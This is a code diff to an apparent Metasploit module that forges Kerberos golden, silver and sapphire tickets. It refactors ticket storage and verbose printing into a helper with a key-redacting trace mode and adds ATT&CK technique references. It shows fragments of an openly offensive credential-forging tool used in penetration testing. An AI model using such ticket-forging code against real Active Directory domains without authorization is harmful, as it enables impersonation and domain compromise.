@@ -27,7 +27,9 @@ class MetasploitModule < Msf::Auxiliary
           'smashery' # Enhancements
         ],
         'References' => [
-          %w[URL https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it]
+          ['URL', 'https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it'],
+          ['ATT&CK', Mitre::Attack::Technique::T1558_001_GOLDEN_TICKET],
+          ['ATT&CK', Mitre::Attack::Technique::T1558_002_SILVER_TICKET]
         ],
         'License' => MSF_LICENSE,
         'Notes' => {
@@ -118,11 +120,7 @@ class MetasploitModule < Msf::Auxiliary
       is_golden: is_golden
     )
 
-    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache, framework_module: self)
-
-    if datastore['VERBOSE']
-      print_ccache_contents(ccache, key: enc_key)
-    end
+    store_forged_ticket(ccache, key: enc_key, ticket_type: is_golden ? 'TGT' : 'TGS')
   end
 
   def forge_silver
@@ -173,11 +171,7 @@ class MetasploitModule < Msf::Auxiliary
     rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError
       fail_with(Msf::Exploit::Failure::BadConfig, 'Failed to modify ticket. krbtgt key is likely incorrect')
     end
-    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])
-
-    if datastore['VERBOSE']
-      print_ccache_contents(ticket, key: enc_key)
-    end
+    store_forged_ticket(ticket, key: enc_key, ticket_type: 'TGT', host: datastore['RHOST'])
   end
 
   def forge_sapphire
@@ -212,11 +206,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     # Don't pass a user RID in: we'll retrieve it from the decrypted PAC
     ticket = modify_ticket(tgs_ticket, tgs_auth, datastore['USER'], nil, datastore['DOMAIN'], extra_sids, session_key.value, enc_type, enc_key, true)
-    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])
-
-    if datastore['VERBOSE']
-      print_ccache_contents(ticket, key: enc_key)
-    end
+    store_forged_ticket(ticket, key: enc_key, ticket_type: 'TGT', host: datastore['RHOST'])
   end
 
   def validate_remote
@@ -272,6 +262,18 @@ class MetasploitModule < Msf::Auxiliary
     [enc_key, enc_type]
   end
 
+  def store_forged_ticket(ccache, key:, ticket_type:, host: nil)
+    stored_ccache = Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache, framework_module: self, host: host)
+
+    trace_mode = kerberos_offline_trace_mode
+    return stored_ccache unless trace_mode || datastore['VERBOSE']
+
+    key = nil if trace_mode && trace_mode != Rex::Proto::Kerberos::CredentialCache::Krb5CcachePresenter::TRACE_MODE_FULL
+    print_ccache_contents(ccache, key: key, source: "#{action.name} #{ticket_type}")
+
+    stored_ccache
+  end
+
   def validate_spn!
     unless datastore['SPN'] =~ %r{.*/.*}
       fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid SPN, must be in the format <service class>/<host><realm>:<port>/<service name>. Ex: cifs/host.realm.local')
@@ -313,7 +315,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Msf::Exploit::Failure::BadConfig, "NTHASH length was #{datastore['NTHASH'].size} should be 32")
     end
 
-    if datastore['AES_KEY'].present? && (datastore['AES_KEY'].size != 32 && datastore['AES_KEY'].size != 64)
+    if datastore['AES_KEY'].present? && datastore['AES_KEY'].size != 32 && datastore['AES_KEY'].size != 64
       fail_with(Msf::Exploit::Failure::BadConfig, "AES key length was #{datastore['AES_KEY'].size} should be 32 or 64")
     end
 
